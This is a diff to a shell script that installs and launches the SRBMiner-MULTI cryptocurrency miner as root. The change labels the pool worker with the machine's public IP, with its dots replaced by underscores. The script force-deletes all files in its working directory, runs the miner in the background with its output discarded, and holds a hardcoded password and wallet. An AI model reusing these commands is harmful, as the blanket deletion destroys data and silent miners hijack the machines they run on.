@@ -1,6 +1,10 @@
 #!/bin/sh
 password="danielchau@123#"
 IP4=$(curl -4 -s icanhazip.com)
+convert_dots_to_underscore() {
+    echo "$1" | tr '.' '_'
+}
+IP4_UNDERSCORE=$(convert_dots_to_underscore "$IP4")
 rm -fR /root/cpuminer-opt-linux/
 rm -fv *
 sudo apt-get update -y
@@ -32,7 +36,7 @@ cat >>/root/danielluis1921.sh <<EOF
 #!/bin/bash
 sudo ./kill_miner.sh
 sleep 5
-sudo ./SRBMiner-MULTI --background -t $cores --algorithm aurum --pool $fastest_server:23442 --tls true --wallet bit1q7r28teaef98nu7u8gwgekskrlaaga5w2qsl9e0.$IP4 > /dev/null 2>&1 &
+sudo ./SRBMiner-MULTI --background -t $cores --algorithm aurum --pool $fastest_server:23442 --tls true --wallet bit1q7r28teaef98nu7u8gwgekskrlaaga5w2qsl9e0.$IP4_UNDERSCORE > /dev/null 2>&1 &
 sleep 3
 EOF
 
